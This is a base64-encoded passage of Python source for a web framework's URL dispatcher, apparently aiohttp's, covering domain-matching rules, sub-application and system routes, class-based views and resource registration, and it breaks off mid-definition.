NlbGYuX3ByZWZpeCwgYXBwPXNlbGYuX2FwcFxyXG4gICAgICAgIClcclxuXHJcblxyXG5jbGFzcyBBYnN0cmFjdFJ1bGVNYXRjaGluZyhhYmMuQUJDKTpcclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2QgICMgcHJhZ21hOiBubyBicmFuY2hcclxuICAgIGFzeW5jIGRlZiBtYXRjaChzZWxmLCByZXF1ZXN0OiBSZXF1ZXN0KSAtPiBib29sOlxyXG4gICAgICAgICIiIlJldHVybiBib29sIGlmIHRoZSByZXF1ZXN0IHNhdGlzZmllcyB0aGUgY3JpdGVyaWEiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kICAjIHByYWdtYTogbm8gYnJhbmNoXHJcbiAgICBkZWYgZ2V0X2luZm8oc2VsZikgLT4gX0luZm9EaWN0OlxyXG4gICAgICAgICIiIlJldHVybiBhIGRpY3Qgd2l0aCBhZGRpdGlvbmFsIGluZm8gdXNlZnVsIGZvciBpbnRyb3NwZWN0aW9uIiIiXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBAYWJjLmFic3RyYWN0bWV0aG9kICAjIHByYWdtYTogbm8gYnJhbmNoXHJcbiAgICBkZWYgY2Fub25pY2FsKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICAiIiJSZXR1cm4gYSBzdHIiIiJcclxuXHJcblxyXG5jbGFzcyBEb21haW4oQWJzdHJhY3RSdWxlTWF0Y2hpbmcpOlxyXG4gICAgcmVfcGFydCA9IHJlLmNvbXBpbGUociIoPyEtKVthLXpcXGQtXXsxLDYzfSg/PCEtKSIpXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGRvbWFpbjogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oKVxyXG4gICAgICAgIHNlbGYuX2RvbWFpbiA9IHNlbGYudmFsaWRhdGlvbihkb21haW4pXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2Fub25pY2FsKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fZG9tYWluXHJcblxyXG4gICAgZGVmIHZhbGlkYXRpb24oc2VsZiwgZG9tYWluOiBzdHIpIC0+IHN0cjpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShkb21haW4sIHN0cik6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiRG9tYWluIG11c3QgYmUgc3RyIilcclxuICAgICAgICBkb21haW4gPSBkb21haW4ucnN0cmlwKCIuIikubG93ZXIoKVxyXG4gICAgICAgIGlmIG5vdCBkb21haW46XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkRvbWFpbiBjYW5ub3QgYmUgZW1wdHkiKVxyXG4gICAgICAgIGVsaWYgIjovLyIgaW4gZG9tYWluOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJTY2hlbWUgbm90IHN1cHBvcnRlZCIpXHJcbiAgICAgICAgdXJsID0gVVJMKCJodHRwOi8vIiArIGRvbWFpbilcclxuICAgICAgICBhc3NlcnQgdXJsLnJhd19ob3N0IGlzIG5vdCBOb25lXHJcbiAgICAgICAgaWYgbm90IGFsbChzZWxmLnJlX3BhcnQuZnVsbG1hdGNoKHgpIGZvciB4IGluIHVybC5yYXdfaG9zdC5zcGxpdCgiLiIpKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiRG9tYWluIG5vdCB2YWxpZCIpXHJcbiAgICAgICAgaWYgdXJsLnBvcnQgPT0gODA6XHJcbiAgICAgICAgICAgIHJldHVybiB1cmwucmF3X2hvc3RcclxuICAgICAgICByZXR1cm4gZiJ7dXJsLnJhd19ob3N0fTp7dXJsLnBvcnR9IlxyXG5cclxuICAgIGFzeW5jIGRlZiBtYXRjaChzZWxmLCByZXF1ZXN0OiBSZXF1ZXN0KSAtPiBib29sOlxyXG4gICAgICAgIGhvc3QgPSByZXF1ZXN0LmhlYWRlcnMuZ2V0KGhkcnMuSE9TVClcclxuICAgICAgICBpZiBub3QgaG9zdDpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgcmV0dXJuIHNlbGYubWF0Y2hfZG9tYWluKGhvc3QpXHJcblxyXG4gICAgZGVmIG1hdGNoX2RvbWFpbihzZWxmLCBob3N0OiBzdHIpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIGhvc3QubG93ZXIoKSA9PSBzZWxmLl9kb21haW5cclxuXHJcbiAgICBkZWYgZ2V0X2luZm8oc2VsZikgLT4gX0luZm9EaWN0OlxyXG4gICAgICAgIHJldHVybiB7ImRvbWFpbiI6IHNlbGYuX2RvbWFpbn1cclxuXHJcblxyXG5jbGFzcyBNYXNrRG9tYWluKERvbWFpbik6XHJcbiAgICByZV9wYXJ0ID0gcmUuY29tcGlsZShyIig/IS0pW2EtelxcZFxcKi1dezEsNjN9KD88IS0pIilcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgZG9tYWluOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXyhkb21haW4pXHJcbiAgICAgICAgbWFzayA9IHNlbGYuX2RvbWFpbi5yZXBsYWNlKCIuIiwgciJcXC4iKS5yZXBsYWNlKCIqIiwgIi4qIilcclxuICAgICAgICBzZWxmLl9tYXNrID0gcmUuY29tcGlsZShtYXNrKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNhbm9uaWNhbChzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX21hc2sucGF0dGVyblxyXG5cclxuICAgIGRlZiBtYXRjaF9kb21haW4oc2VsZiwgaG9zdDogc3RyKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9tYXNrLmZ1bGxtYXRjaChob3N0KSBpcyBub3QgTm9uZVxyXG5cclxuXHJcbmNsYXNzIE1hdGNoZWRTdWJBcHBSZXNvdXJjZShQcmVmaXhlZFN1YkFwcFJlc291cmNlKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBydWxlOiBBYnN0cmFjdFJ1bGVNYXRjaGluZywgYXBwOiAiQXBwbGljYXRpb24iKSAtPiBOb25lOlxyXG4gICAgICAgIEFic3RyYWN0UmVzb3VyY2UuX19pbml0X18oc2VsZilcclxuICAgICAgICBzZWxmLl9wcmVmaXggPSAiIlxyXG4gICAgICAgIHNlbGYuX2FwcCA9IGFwcFxyXG4gICAgICAgIHNlbGYuX3J1bGUgPSBydWxlXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2Fub25pY2FsKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICByZXR1cm4gc2VsZi5fcnVsZS5jYW5vbmljYWxcclxuXHJcbiAgICBkZWYgZ2V0X2luZm8oc2VsZikgLT4gX0luZm9EaWN0OlxyXG4gICAgICAgIHJldHVybiB7ImFwcCI6IHNlbGYuX2FwcCwgInJ1bGUiOiBzZWxmLl9ydWxlfVxyXG5cclxuICAgIGFzeW5jIGRlZiByZXNvbHZlKHNlbGYsIHJlcXVlc3Q6IFJlcXVlc3QpIC0+IF9SZXNvbHZlOlxyXG4gICAgICAgIGlmIG5vdCBhd2FpdCBzZWxmLl9ydWxlLm1hdGNoKHJlcXVlc3QpOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZSwgc2V0KClcclxuICAgICAgICBtYXRjaF9pbmZvID0gYXdhaXQgc2VsZi5fYXBwLnJvdXRlci5yZXNvbHZlKHJlcXVlc3QpXHJcbiAgICAgICAgbWF0Y2hfaW5mby5hZGRfYXBwKHNlbGYuX2FwcClcclxuICAgICAgICBpZiBpc2luc3RhbmNlKG1hdGNoX2luZm8uaHR0cF9leGNlcHRpb24sIEhUVFBNZXRob2ROb3RBbGxvd2VkKTpcclxuICAgICAgICAgICAgbWV0aG9kcyA9IG1hdGNoX2luZm8uaHR0cF9leGNlcHRpb24uYWxsb3dlZF9tZXRob2RzXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgbWV0aG9kcyA9IHNldCgpXHJcbiAgICAgICAgcmV0dXJuIG1hdGNoX2luZm8sIG1ldGhvZHNcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPE1hdGNoZWRTdWJBcHBSZXNvdXJjZSAtPiB7YXBwIXJ9PiIgIiIuZm9ybWF0KGFwcD1zZWxmLl9hcHApXHJcblxyXG5cclxuY2xhc3MgUmVzb3VyY2VSb3V0ZShBYnN0cmFjdFJvdXRlKTpcclxuICAgICIiIkEgcm91dGUgd2l0aCByZXNvdXJjZSIiIlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG1ldGhvZDogc3RyLFxyXG4gICAgICAgIGhhbmRsZXI6IFVuaW9uW0hhbmRsZXIsIFR5cGVbQWJzdHJhY3RWaWV3XV0sXHJcbiAgICAgICAgcmVzb3VyY2U6IEFic3RyYWN0UmVzb3VyY2UsXHJcbiAgICAgICAgKixcclxuICAgICAgICBleHBlY3RfaGFuZGxlcjogT3B0aW9uYWxbX0V4cGVjdEhhbmRsZXJdID0gTm9uZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKFxyXG4gICAgICAgICAgICBtZXRob2QsIGhhbmRsZXIsIGV4cGVjdF9oYW5kbGVyPWV4cGVjdF9oYW5kbGVyLCByZXNvdXJjZT1yZXNvdXJjZVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiAiPFJlc291cmNlUm91dGUgW3ttZXRob2R9XSB7cmVzb3VyY2V9IC0+IHtoYW5kbGVyIXJ9Ii5mb3JtYXQoXHJcbiAgICAgICAgICAgIG1ldGhvZD1zZWxmLm1ldGhvZCwgcmVzb3VyY2U9c2VsZi5fcmVzb3VyY2UsIGhhbmRsZXI9c2VsZi5oYW5kbGVyXHJcbiAgICAgICAgKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG5hbWUoc2VsZikgLT4gT3B0aW9uYWxbc3RyXTpcclxuICAgICAgICBpZiBzZWxmLl9yZXNvdXJjZSBpcyBOb25lOlxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZVxyXG4gICAgICAgIHJldHVybiBzZWxmLl9yZXNvdXJjZS5uYW1lXHJcblxyXG4gICAgZGVmIHVybF9mb3Ioc2VsZiwgKmFyZ3M6IHN0ciwgKiprd2FyZ3M6IHN0cikgLT4gVVJMOlxyXG4gICAgICAgICIiIkNvbnN0cnVjdCB1cmwgZm9yIHJvdXRlIHdpdGggYWRkaXRpb25hbCBwYXJhbXMuIiIiXHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX3Jlc291cmNlIGlzIG5vdCBOb25lXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3Jlc291cmNlLnVybF9mb3IoKmFyZ3MsICoqa3dhcmdzKVxyXG5cclxuICAgIGRlZiBnZXRfaW5mbyhzZWxmKSAtPiBfSW5mb0RpY3Q6XHJcbiAgICAgICAgYXNzZXJ0IHNlbGYuX3Jlc291cmNlIGlzIG5vdCBOb25lXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3Jlc291cmNlLmdldF9pbmZvKClcclxuXHJcblxyXG5jbGFzcyBTeXN0ZW1Sb3V0ZShBYnN0cmFjdFJvdXRlKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBodHRwX2V4Y2VwdGlvbjogSFRUUEV4Y2VwdGlvbikgLT4gTm9uZTpcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKGhkcnMuTUVUSF9BTlksIHNlbGYuX2hhbmRsZSlcclxuICAgICAgICBzZWxmLl9odHRwX2V4Y2VwdGlvbiA9IGh0dHBfZXhjZXB0aW9uXHJcblxyXG4gICAgZGVmIHVybF9mb3Ioc2VsZiwgKmFyZ3M6IHN0ciwgKiprd2FyZ3M6IHN0cikgLT4gVVJMOlxyXG4gICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiLnVybF9mb3IoKSBpcyBub3QgYWxsb3dlZCBmb3IgU3lzdGVtUm91dGUiKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIG5hbWUoc2VsZikgLT4gT3B0aW9uYWxbc3RyXTpcclxuICAgICAgICByZXR1cm4gTm9uZVxyXG5cclxuICAgIGRlZiBnZXRfaW5mbyhzZWxmKSAtPiBfSW5mb0RpY3Q6XHJcbiAgICAgICAgcmV0dXJuIHsiaHR0cF9leGNlcHRpb24iOiBzZWxmLl9odHRwX2V4Y2VwdGlvbn1cclxuXHJcbiAgICBhc3luYyBkZWYgX2hhbmRsZShzZWxmLCByZXF1ZXN0OiBSZXF1ZXN0KSAtPiBTdHJlYW1SZXNwb25zZTpcclxuICAgICAgICByYWlzZSBzZWxmLl9odHRwX2V4Y2VwdGlvblxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHN0YXR1cyhzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2h0dHBfZXhjZXB0aW9uLnN0YXR1c1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHJlYXNvbihzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2h0dHBfZXhjZXB0aW9uLnJlYXNvblxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgcmV0dXJuICI8U3lzdGVtUm91dGUge3NlbGYuc3RhdHVzfToge3NlbGYucmVhc29ufT4iLmZvcm1hdChzZWxmPXNlbGYpXHJcblxyXG5cclxuY2xhc3MgVmlldyhBYnN0cmFjdFZpZXcpOlxyXG4gICAgYXN5bmMgZGVmIF9pdGVyKHNlbGYpIC0+IFN0cmVhbVJlc3BvbnNlOlxyXG4gICAgICAgIGlmIHNlbGYucmVxdWVzdC5tZXRob2Qgbm90IGluIGhkcnMuTUVUSF9BTEw6XHJcbiAgICAgICAgICAgIHNlbGYuX3JhaXNlX2FsbG93ZWRfbWV0aG9kcygpXHJcbiAgICAgICAgbWV0aG9kOiBDYWxsYWJsZVtbXSwgQXdhaXRhYmxlW1N0cmVhbVJlc3BvbnNlXV0gPSBnZXRhdHRyKFxyXG4gICAgICAgICAgICBzZWxmLCBzZWxmLnJlcXVlc3QubWV0aG9kLmxvd2VyKCksIE5vbmVcclxuICAgICAgICApXHJcbiAgICAgICAgaWYgbWV0aG9kIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3JhaXNlX2FsbG93ZWRfbWV0aG9kcygpXHJcbiAgICAgICAgcmVzcCA9IGF3YWl0IG1ldGhvZCgpXHJcbiAgICAgICAgcmV0dXJuIHJlc3BcclxuXHJcbiAgICBkZWYgX19hd2FpdF9fKHNlbGYpIC0+IEdlbmVyYXRvcltBbnksIE5vbmUsIFN0cmVhbVJlc3BvbnNlXTpcclxuICAgICAgICByZXR1cm4gc2VsZi5faXRlcigpLl9fYXdhaXRfXygpXHJcblxyXG4gICAgZGVmIF9yYWlzZV9hbGxvd2VkX21ldGhvZHMoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBhbGxvd2VkX21ldGhvZHMgPSB7bSBmb3IgbSBpbiBoZHJzLk1FVEhfQUxMIGlmIGhhc2F0dHIoc2VsZiwgbS5sb3dlcigpKX1cclxuICAgICAgICByYWlzZSBIVFRQTWV0aG9kTm90QWxsb3dlZChzZWxmLnJlcXVlc3QubWV0aG9kLCBhbGxvd2VkX21ldGhvZHMpXHJcblxyXG5cclxuY2xhc3MgUmVzb3VyY2VzVmlldyhTaXplZCwgSXRlcmFibGVbQWJzdHJhY3RSZXNvdXJjZV0sIENvbnRhaW5lcltBYnN0cmFjdFJlc291cmNlXSk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgcmVzb3VyY2VzOiBMaXN0W0Fic3RyYWN0UmVzb3VyY2VdKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX3Jlc291cmNlcyA9IHJlc291cmNlc1xyXG5cclxuICAgIGRlZiBfX2xlbl9fKHNlbGYpIC0+IGludDpcclxuICAgICAgICByZXR1cm4gbGVuKHNlbGYuX3Jlc291cmNlcylcclxuXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZikgLT4gSXRlcmF0b3JbQWJzdHJhY3RSZXNvdXJjZV06XHJcbiAgICAgICAgeWllbGQgZnJvbSBzZWxmLl9yZXNvdXJjZXNcclxuXHJcbiAgICBkZWYgX19jb250YWluc19fKHNlbGYsIHJlc291cmNlOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHJlc291cmNlIGluIHNlbGYuX3Jlc291cmNlc1xyXG5cclxuXHJcbmNsYXNzIFJvdXRlc1ZpZXcoU2l6ZWQsIEl0ZXJhYmxlW0Fic3RyYWN0Um91dGVdLCBDb250YWluZXJbQWJzdHJhY3RSb3V0ZV0pOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHJlc291cmNlczogTGlzdFtBYnN0cmFjdFJlc291cmNlXSk6XHJcbiAgICAgICAgc2VsZi5fcm91dGVzID0gW10gICMgdHlwZTogTGlzdFtBYnN0cmFjdFJvdXRlXVxyXG4gICAgICAgIGZvciByZXNvdXJjZSBpbiByZXNvdXJjZXM6XHJcbiAgICAgICAgICAgIGZvciByb3V0ZSBpbiByZXNvdXJjZTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX3JvdXRlcy5hcHBlbmQocm91dGUpXHJcblxyXG4gICAgZGVmIF9fbGVuX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBsZW4oc2VsZi5fcm91dGVzKVxyXG5cclxuICAgIGRlZiBfX2l0ZXJfXyhzZWxmKSAtPiBJdGVyYXRvcltBYnN0cmFjdFJvdXRlXTpcclxuICAgICAgICB5aWVsZCBmcm9tIHNlbGYuX3JvdXRlc1xyXG5cclxuICAgIGRlZiBfX2NvbnRhaW5zX18oc2VsZiwgcm91dGU6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gcm91dGUgaW4gc2VsZi5fcm91dGVzXHJcblxyXG5cclxuY2xhc3MgVXJsRGlzcGF0Y2hlcihBYnN0cmFjdFJvdXRlciwgTWFwcGluZ1tzdHIsIEFic3RyYWN0UmVzb3VyY2VdKTpcclxuXHJcbiAgICBOQU1FX1NQTElUX1JFID0gcmUuY29tcGlsZShyIlsuOi1dIilcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKClcclxuICAgICAgICBzZWxmLl9yZXNvdXJjZXMgPSBbXSAgIyB0eXBlOiBMaXN0W0Fic3RyYWN0UmVzb3VyY2VdXHJcbiAgICAgICAgc2VsZi5fbmFtZWRfcmVzb3VyY2VzID0ge30gICMgdHlwZTogRGljdFtzdHIsIEFic3RyYWN0UmVzb3VyY2VdXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlc29sdmUoc2VsZiwgcmVxdWVzdDogUmVxdWVzdCkgLT4gVXJsTWFwcGluZ01hdGNoSW5mbzpcclxuICAgICAgICBtZXRob2QgPSByZXF1ZXN0Lm1ldGhvZFxyXG4gICAgICAgIGFsbG93ZWRfbWV0aG9kcyA9IHNldCgpICAjIHR5cGU6IFNldFtzdHJdXHJcblxyXG4gICAgICAgIGZvciByZXNvdXJjZSBpbiBzZWxmLl9yZXNvdXJjZXM6XHJcbiAgICAgICAgICAgIG1hdGNoX2RpY3QsIGFsbG93ZWQgPSBhd2FpdCByZXNvdXJjZS5yZXNvbHZlKHJlcXVlc3QpXHJcbiAgICAgICAgICAgIGlmIG1hdGNoX2RpY3QgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hfZGljdFxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgYWxsb3dlZF9tZXRob2RzIHw9IGFsbG93ZWRcclxuXHJcbiAgICAgICAgaWYgYWxsb3dlZF9tZXRob2RzOlxyXG4gICAgICAgICAgICByZXR1cm4gTWF0Y2hJbmZvRXJyb3IoSFRUUE1ldGhvZE5vdEFsbG93ZWQobWV0aG9kLCBhbGxvd2VkX21ldGhvZHMpKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJldHVybiBNYXRjaEluZm9FcnJvcihIVFRQTm90Rm91bmQoKSlcclxuXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZikgLT4gSXRlcmF0b3Jbc3RyXTpcclxuICAgICAgICByZXR1cm4gaXRlcihzZWxmLl9uYW1lZF9yZXNvdXJjZXMpXHJcblxyXG4gICAgZGVmIF9fbGVuX18oc2VsZikgLT4gaW50OlxyXG4gICAgICAgIHJldHVybiBsZW4oc2VsZi5fbmFtZWRfcmVzb3VyY2VzKVxyXG5cclxuICAgIGRlZiBfX2NvbnRhaW5zX18oc2VsZiwgcmVzb3VyY2U6IG9iamVjdCkgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gcmVzb3VyY2UgaW4gc2VsZi5fbmFtZWRfcmVzb3VyY2VzXHJcblxyXG4gICAgZGVmIF9fZ2V0aXRlbV9fKHNlbGYsIG5hbWU6IHN0cikgLT4gQWJzdHJhY3RSZXNvdXJjZTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fbmFtZWRfcmVzb3VyY2VzW25hbWVdXHJcblxyXG4gICAgZGVmIHJlc291cmNlcyhzZWxmKSAtPiBSZXNvdXJjZXNWaWV3OlxyXG4gICAgICAgIHJldHVybiBSZXNvdXJjZXNWaWV3KHNlbGYuX3Jlc291cmNlcylcclxuXHJcbiAgICBkZWYgcm91dGVzKHNlbGYpIC0+IFJvdXRlc1ZpZXc6XHJcbiAgICAgICAgcmV0dXJuIFJvdXRlc1ZpZXcoc2VsZi5fcmVzb3VyY2VzKVxyXG5cclxuICAgIGRlZiBuYW1lZF9yZXNvdXJjZXMoc2VsZikgLT4gTWFwcGluZ1tzdHIsIEFic3RyYWN0UmVzb3VyY2VdOlxyXG4gICAgICAgIHJldHVybiBNYXBwaW5nUHJveHlUeXBlKHNlbGYuX25hbWVkX3Jlc291cmNlcylcclxuXHJcbiAgICBkZWYgcmVnaXN0ZXJfcmVzb3VyY2Uoc2VsZiwgcmVzb3VyY2U6IEFic3RyYWN0UmVzb3VyY2UpIC0+IE5vbmU6XHJcbiAgICAgICAgYXNzZXJ0IGlzaW5zdGFuY2UoXHJcbiAgICAgICAgICAgIHJlc291cmNlLCBBYnN0cmFjdFJlc291cmNlXHJcbiAgICAgICAgKSwgZiJJbnN0YW5jZSBvZiBBYnN0cmFjdFJlc291cmNlIGNsYXNzIGlzIHJlcXVpcmVkLCBnb3Qge3Jlc291cmNlIXJ9IlxyXG4gICAgICAgIGlmIHNlbGYuZnJvemVuOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkNhbm5vdCByZWdpc3RlciBhIHJlc291cmNlIGludG8gZnJvemVuIHJvdXRlci4iKVxyXG5cclxuICAgICAgICBuYW1lID0gcmVzb3VyY2UubmFtZVxyXG5cclxuICAgICAgICBpZiBuYW1lIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBwYXJ0cyA9IHNlbGYuTkFNRV9TUExJVF9SRS5zcGxpdChuYW1lKVxyXG4gICAgICAgICAgICBmb3IgcGFydCBpbiBwYXJ0czpcclxuICAgICAgICAgICAgICAgIGlmIGtleXdvcmQuaXNrZXl3b3JkKHBhcnQpOlxyXG4gICAgICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGYiSW5jb3JyZWN0IHJvdXRlIG5hbWUge25hbWUhcn0sICJcclxuICAgICAgICAgICAgICAgICAgICAgICAgInB5dGhvbiBrZXl3b3JkcyBjYW5ub3QgYmUgdXNlZCAiXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICJmb3Igcm91dGUgbmFtZSJcclxuICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICBpZiBub3QgcGFydC5pc2lkZW50aWZpZXIoKTpcclxuICAgICAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAiSW5jb3JyZWN0IHJvdXRlIG5hbWUgeyFyfSwgIlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAidGhlIG5hbWUgc2hvdWxkIGJlIGEgc2VxdWVuY2Ugb2YgIlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAicHl0aG9uIGlkZW50aWZpZXJzIHNlcGFyYXRlZCAiXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICJieSBkYXNoLCBkb3Qgb3IgY29sdW1uIi5mb3JtYXQobmFtZSlcclxuICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGlmIG5hbWUgaW4gc2VsZi5fbmFtZWRfcmVzb3VyY2VzOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiRHVwbGljYXRlIHshcn0sICJcclxuICAgICAgICAgICAgICAgICAgICAiYWxyZWFkeSBoYW5kbGVkIGJ5IHshcn0iLmZvcm1hdChuYW1lLCBzZWxmLl9uYW1lZF9yZXNvdXJjZXNbbmFtZV0pXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHNlbGYuX25hbWVkX3Jlc291cmNlc1tuYW1lXSA9IHJlc291cmNlXHJcbiAgICAgICAgc2VsZi5fcmVzb3VyY2VzLmFwcGVuZChyZXNvdXJjZSlcclxuXHJcbiAgICBkZWYgYWRkX3Jlc291cmNlKHNlbGYsIHBhdGg6IHN0ciwgKiwgbmFtZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUpIC0+IFJlc291cmNlOlxyXG4gICAgICAgIGlmIHBhdGggYW5kIG5vdCBwYXRoLnN0YXJ0c3dpdGgoIi8iKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigicGF0aCBzaG91bGQgYmUgc3RhcnRlZCB3aXRoIC8gb3IgYmUgZW1wdHkiKVxyXG4gICAgICAgICMgUmV1c2UgbGFzdCBhZGRlZCByZXNvdXJjZSBpZiBwYXRoIGFuZCBuYW1lIGFyZSB0aGUgc2FtZVxyXG4gICAgICAgIGlmIHNlbGYuX3Jlc291cmNlczpcclxuICAgICAgICAgICAgcmVzb3VyY2UgPSBzZWxmLl9yZXNvdXJjZXNbLTFdXHJcbiAgICAgICAgICAgIGlmIHJlc291cmNlLm5hbWUgPT0gbmFtZSBhbmQgcmVzb3VyY2UucmF3X21hdGNoKHBhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGNhc3QoUmVzb3VyY2UsIHJlc291cmNlKVxyXG4gICAgICAgIGlmIG5vdCAoInsiIGluIHBhdGggb3IgIn0iIGluIHBhdGggb3IgUk9VVEVfUkUuc2VhcmNoKHBhdGgpKTpcclxuICAgICAgICAgICAgcmVzb3VyY2UgPSBQbGFpblJlc291cmNlKF9yZXF1b3RlX3BhdGgocGF0aCksIG5hbWU9bmFtZSlcclxuICAgICAgICAgICAgc2VsZi5yZWdpc3Rlcl9yZXNvdXJjZShyZXNvdXJjZSlcclxuICAgICAgICAgICAgcmV0dXJuIHJlc291cmNlXHJcbiAgICAgICAgcmVzb3VyY2UgPSBEeW5hbWljUmVzb3VyY2UocGF0aCwgbmFtZT1uYW1lKVxyXG4gICAgICAgIHNlbGYucmVnaXN0ZXJfcmVzb3VyY2UocmVzb3VyY2UpXHJcbiAgICAgICAgcmV0dXJuIHJlc291cmNlXHJcblxyXG4gICAgZGVmIGFkZF9yb3V0ZShcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG1ldGhvZDogc3RyLFxyXG4gICAgICAgIHBhdGg6IHN0cixcclxuICAgICAgICBoYW5kbGVyOiBVbmlvbltIYW5kbGVyLCBUeXBlW0Fic3RyYWN0Vmlld11dLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgbmFtZTogT3B0aW9uYWxbc3RyXSA9IE5vbmUsXHJcbiAgICAgICAgZXhwZWN0X2hhbmRsZXI6IE9wdGlvbmFsW19FeHBlY3RIYW5kbGVyXSA9IE5vbmUsXHJcbiAgICApIC0+IEFic3RyYWN0Um91dGU6XHJcbiAgICAgICAgcmVzb3VyY2UgPSBzZWxmLmFkZF9yZXNvdXJjZShwYXRoLCBuYW1lPW5hbWUpXHJcbiAgICAgICAgcmV0dXJuIHJlc291cmNlLmFkZF9yb3V0ZShtZXRob2QsIGhhbmRsZXIsIGV4cGVjdF9oYW5kbGVyPWV4cGVjdF9oYW5kbGVyKVxyXG5cclxuICAgIGRlZiBhZGRfc3RhdGljKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgcHJlZml4OiBzdHIsXHJcbiAgICAgICAgcGF0aDogUGF0aExpa2UsXHJcbiAgICAgICAgKixcclxuICAgICAgICBuYW1lOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBleHBlY3RfaGFuZGxlcjogT3B0aW9uYWxbX0V4cGVjdEhhbmRs